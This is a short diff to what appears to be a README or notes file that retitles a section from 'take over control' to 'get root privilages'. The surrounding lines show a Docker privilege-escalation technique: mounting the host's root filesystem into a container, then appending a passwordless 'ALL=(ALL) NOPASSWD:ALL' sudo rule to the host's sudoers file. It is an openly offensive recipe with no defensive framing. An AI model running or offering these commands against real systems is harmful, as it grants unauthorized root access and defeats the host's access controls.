@@ -22,7 +22,7 @@ WORKDIR $WORKDIR
 docker build -t directory .
 docker run -v /:/directory -it directory /bin/sh
 ```
-- take over control :>
+- get root privilages 
 ```
 echo "username ALL=(ALL) NOPASSWD:ALL" >> /directory/etc/sudoers
 ```
